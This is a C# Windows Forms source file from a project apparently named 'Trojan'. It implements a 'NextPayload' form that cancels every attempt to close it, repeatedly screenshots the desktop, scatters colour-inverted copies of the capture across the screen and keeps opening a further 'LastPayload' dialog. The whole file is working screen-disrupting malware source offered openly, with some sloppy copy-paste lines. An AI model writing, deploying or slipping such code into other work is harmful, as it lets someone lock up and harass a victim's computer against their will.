using System;
using System.Drawing;
using System.Windows.Forms;

namespace Trojan
{
    public partial class NextPayload : Form
    {
        Graphics gfx;
        Bitmap bmp;
        Random rand;

        public NextPayload( ) => InitializeComponent( );

        private void NextPayload_FormClosing( object sender, FormClosingEventArgs e ) => e.Cancel = true;

        private void NextPayload_Load( object sender, EventArgs e )
        {
            LoopTMR.Start( );
            BackTMR.Start( );

            rand = new Random( );
        }

        private void LoopTMR_Tick( object sender, EventArgs e )
        {
            LoopTMR.Stop( );

            var endWidth = 500;
            var endHeight = 500;
            var scaleFactor = 1;

            var startWidth = endWidth / scaleFactor;
            var startHeight = endHeight / scaleFactor;

            bmp = new Bitmap( startWidth, startHeight );

            gfx = CreateGraphics( );
            gfx = Graphics.FromImage( bmp );

            var xPos = Math.Min( 0, MousePosition.X - ( startWidth / 500 ) );
            var yPos = Math.Min( 0, MousePosition.Y - ( startHeight / 500 ) );

            gfx.CopyFromScreen( xPos, yPos, 0, 0, new Size( endWidth, endWidth ) );

            pictureBox1 = new PictureBox( );
            pictureBox1.BackColor = Color.Transparent;
            pictureBox1.Height = 300;
            pictureBox1.Width = 300;

            pictureBox1.Location = new Point( rand.Next( 0, Screen.PrimaryScreen.Bounds.Width ), rand.Next( 0, Screen.PrimaryScreen.Bounds.Height ) );

            Controls.Add( pictureBox1 );

            pictureBox2 = new PictureBox( );
            pictureBox1.BackColor = Color.Transparent;
            pictureBox2.Height = 240;
            pictureBox2.Width = 180;

            pictureBox2.Location = new Point( rand.Next( 0, Screen.PrimaryScreen.Bounds.Width ), rand.Next( 0, Screen.PrimaryScreen.Bounds.Height ) );

            Controls.Add( pictureBox2 );

            pictureBox3 = new PictureBox( );
            pictureBox1.BackColor = Color.Transparent;
            pictureBox3.Height = 300;
            pictureBox3.Width = 300;

            pictureBox3.Location = new Point( rand.Next( 0, Screen.PrimaryScreen.Bounds.Width ), rand.Next( 0, Screen.PrimaryScreen.Bounds.Height ) );

            Controls.Add( pictureBox3 );
            pictureBox4 = new PictureBox( );
            pictureBox1.BackColor = Color.Transparent;
            pictureBox4.Height = 300;
            pictureBox4.Width = 300;

            pictureBox4.Location = new Point( rand.Next (0, Screen.PrimaryScreen.Bounds.Width ), rand.Next( 0, Screen.PrimaryScreen.Bounds.Height ) );

            Controls.Add( pictureBox4 );

            pictureBox5 = new PictureBox( );
            pictureBox1.BackColor = Color.Transparent;
            pictureBox5.Height = 150;
            pictureBox5.Width = 200;

            pictureBox5.Location = new Point( rand.Next( 0, Screen.PrimaryScreen.Bounds.Width ), rand.Next( 0, Screen.PrimaryScreen.Bounds.Height ) );

            Controls.Add( pictureBox5 );

            pictureBox1.Image = bmp;
            pictureBox2.Image = bmp;
            pictureBox3.Image = bmp;
            pictureBox4.Image = bmp;
            pictureBox5.Image = bmp;

            var pic = new Bitmap( pictureBox3.Image );

            for ( int y = 0; ( y <= ( pic.Height - 1 ) ); y++ )
            {
                for ( int x = 0; ( x <= ( pic.Width - 1 ) ); x++ )
                {
                    var inv = pic.GetPixel( x, y );
                    inv = Color.FromArgb( 255, ( 255 - inv.R ), ( 255 - inv.G ), ( 255 - inv.B ) );

                    pic.SetPixel( x, y, inv );
                }
            }

            pictureBox3.Image = pic;

            var pic2 = new Bitmap( pictureBox5.Image );

            for ( int y = 0; ( y <= ( pic2.Height - 1 ) ); y++ )
            {
                for ( int x = 0; ( x <= ( pic2.Width - 1 ) ); x++ )
                {
                    var inv = pic2.GetPixel( x, y );
                    inv = Color.FromArgb( 255, ( 255 - inv.R ), ( 255 - inv.G ), ( 255 - inv.B ) );

                    pic2.SetPixel( x, y, inv );
                }
            }
            pictureBox5.Image = pic2;

            LoopTMR.Start( );
        }

        private void BackTMR_Tick( object sender, EventArgs e )
        {
            BackTMR.Stop( );

            var LastPayloadForm = new LastPayload( );

            LastPayloadForm.ShowDialog( );
            BackTMR.Start( );
        }
    }
}
